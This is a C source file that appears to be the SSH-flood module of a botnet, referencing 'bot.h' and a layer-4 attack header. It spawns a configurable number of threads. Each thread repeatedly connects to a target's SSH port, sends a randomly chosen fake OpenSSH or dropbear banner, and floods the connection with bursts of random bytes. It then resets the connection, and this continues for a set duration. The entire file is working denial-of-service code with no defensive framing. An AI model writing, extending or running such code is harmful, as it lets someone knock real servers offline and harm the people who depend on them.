#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static const char *ssh_banners[] = {
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3",
    "SSH-2.0-OpenSSH_9.2p1 Debian-2",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-OpenSSH_9.7",
    "SSH-2.0-dropbear_2022.83",
};

void *ssh_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    XorShift64 *rng = rng_new();
    uint8_t buf[1400];
    rng_fill(rng, buf, 1400);
    time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct timeval tv = {3, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(fd); sleep_ms(10); continue;
        }
        int bi = (int)(rng_next(rng) % 5);
        write(fd, ssh_banners[bi], strlen(ssh_banners[bi]));
        write(fd, "\r\n", 2);
        int bursts = 10 + (int)(rng_next(rng) % 40);
        for (int j = 0; j < bursts; j++) {
            if (write(fd, buf, 1400) <= 0) break;
        }
        struct linger l = {1, 0};
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd);
    }
    free(rng);
    return NULL;
}

void flood_ssh(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, ssh_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
